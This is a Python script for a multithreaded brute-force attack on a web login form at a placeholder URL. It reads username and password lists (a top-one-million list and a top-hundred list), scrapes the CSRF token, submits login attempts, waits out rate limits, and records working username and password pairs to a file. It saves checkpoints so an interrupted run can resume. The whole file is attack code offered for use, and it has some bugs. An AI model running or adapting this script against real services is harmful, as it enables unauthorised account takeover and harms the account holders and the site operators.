#!/usr/bin/python3
from binascii import a2b_hex
from enum import Flag
from multiprocessing.connection import wait
from pickle import TRUE
from re import search
import requests
from urllib.parse import quote_plus
import threading
import time
url="https:/example.com/login"

listPwd=list()
listUser=list()
currentPass=""
numberOfPass=0
shouldIncreasing=[]

def save( count):

    with open("counttoken.txt",'w') as f:
        f.write(str(count))


def check(user,pwd,token,cookies):

    global url
    data={'_token':token,'username':user,'password': pwd}
    y= requests.post(url,data=data,cookies=cookies)
    if search("Phiên làm việc đã hết hạn",y.text) != None:
        print("Reset")
        return True
    if y.status_code ==500:
        return False
    if search("không đúng",y.text)!=None:
        return False
    if search("lần giới hạn",y.text) !=None:
        time.sleep(60)
        check(user,pwd)
        return False
    
    save=search('class="icon-user"></i>(.*?)</a>',y.text)
    with open('filter.txt','a') as f:
        f.write(save.group(1)+pwd)
    with open('n_found.txt','a') as f:
        f.write(user+";"+pwd+"\n")
    return True



def restore(fh):
    with open("counttoken.txt", "r") as f:
        d = f.readline()
        print("count: "+d)
    try:
        count=int(d)
    except:
        save(0)
        restore(fh)
    for i in range(count):
        fh.readline()
    return count

def start(listFileUser,listFilePwd,port):
    global listPwd
    global listUser
    global shouldIncreasing
    shouldIncreasing=[False for i in range(port)]
    with open(listFileUser,'r', encoding="ISO-8859-1") as fh:
        count=restore(fh)
        listUser=fh.readlines()
        f=open(listFilePwd,'r', encoding="ISO-8859-1")
        for skip in range(count):
            f.readline()
        listPwd=f.readlines()
        f.close()
    for i in range(port) :
        myThread(int(i)+1,int(i) ,port,count).start()



class myThread (threading.Thread):
    def __init__(self, threadID, counter,port,count):
      threading.Thread.__init__(self)
      self.threadID = threadID
      self.counter = counter
      self.port=port
      self.count=count
    def run(self):
        self.print_time(self.threadID, self.counter,self.port,self.count)



    def print_time(self,ID, counter,port,count):
            global listPwd
            global listUser
            global currentPass
            global numberOfPass
            if(ID==1):
                currentPass=listPwd[numberOfPass].strip()
           
            while numberOfPass<len(listPwd):
                pwd=currentPass
                shouldIncreasing[counter]
                countUser=counter
                user=listUser[countUser].strip()
                x = requests.get(url)
                token= search('"_token" value="(.*?)"',x.text)
                while  countUser<len(listUser):
                    if check(user,pwd,token.group(1),x.cookies):
                        x=requests.get(url)
                        token=search('"_token" value="(.*?)"',x.text)            
                    user=listUser[countUser].strip()
                    countUser+=port
                if(ID==1):
                    numberOfPass+=1
                    currentPass=listPwd[numberOfPass]
                shouldIncreasing[counter]=True
                while all(shouldIncreasing)==False:
                    print("sleep")
                    time.sleep(1)
                with open('counttoken.txt','r',encoding='utf-8')as w:
                    line=int(w.readline())
                if numberOfPass+count>line and numberOfPass%10==0:
                    save(numberOfPass+count)
        
#call
#start('vn-list/list.txt')


start('../top1m.txt','../top100.txt',4)
